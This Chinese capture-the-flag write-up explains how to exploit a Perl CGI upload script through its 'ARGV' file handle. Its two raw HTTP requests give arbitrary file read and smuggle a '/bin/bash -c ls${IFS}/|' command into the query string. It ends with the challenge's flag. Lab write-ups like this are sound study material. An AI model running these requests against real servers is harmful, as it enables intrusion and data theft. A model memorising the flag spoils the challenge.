# i_god_id_200

## 思路分析

> 打开网站,点击Files会跳转到/cgi-bin/file.pl文件中进行执行.这里可以上传任何一个文件,然后会在下方打印出内容.那么我们猜测后台使用了param()函数.

> param()函数会返回一个列表的文件,但是只有第一个文件会被放入到下面的file变量中.如果我们传入一个ARGV的文件,那么Perl会将传入的参数作为文件名读出来.在正常的上传文件前面加上一个文件上传项ARGV,然后在URL中传入文件路径参数,可以实现读取任意文件.ARGV是PERL默认用来接收参数的数组,不管脚本里有没有把它写出来,它始终是存在的.

> 题解就是直接读取flag文件或者通过使用IFS作为命令分割,查看根目录有哪些文件,IFS为shell的字段分隔符,可将字符串按照特性的格式进行分割

## payload

```
POST /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| HTTP/1.1
Host: 61.147.171.105:59518
Content-Length: 409
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:59518
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8uk0irNsl07ecKM5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:59518/cgi-bin/file.pl
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; last_login_info=YToxOntzOjI6ImlwIjtzOjExOiI1MC43LjI1Mi41OCI7fQ%3D%3D
Connection: close

------WebKitFormBoundary8uk0irNsl07ecKM5
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
------WebKitFormBoundary8uk0irNsl07ecKM5
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: image/jpeg

test
------WebKitFormBoundary8uk0irNsl07ecKM5
Content-Disposition: form-data; name="Submit!"

Submit!
------WebKitFormBoundary8uk0irNsl07ecKM5--
```

```
POST /cgi-bin/file.pl?/flag HTTP/1.1
Host: 61.147.171.105:59518
Content-Length: 409
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:59518
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8uk0irNsl07ecKM5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:59518/cgi-bin/file.pl
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; last_login_info=YToxOntzOjI6ImlwIjtzOjExOiI1MC43LjI1Mi41OCI7fQ%3D%3D
Connection: close

------WebKitFormBoundary8uk0irNsl07ecKM5
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
------WebKitFormBoundary8uk0irNsl07ecKM5
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: image/jpeg

test
------WebKitFormBoundary8uk0irNsl07ecKM5
Content-Disposition: form-data; name="Submit!"

Submit!
------WebKitFormBoundary8uk0irNsl07ecKM5--
```

## flag

> cyberpeace{beeeb3cbab1f59ad86d5ccd71e1592fa}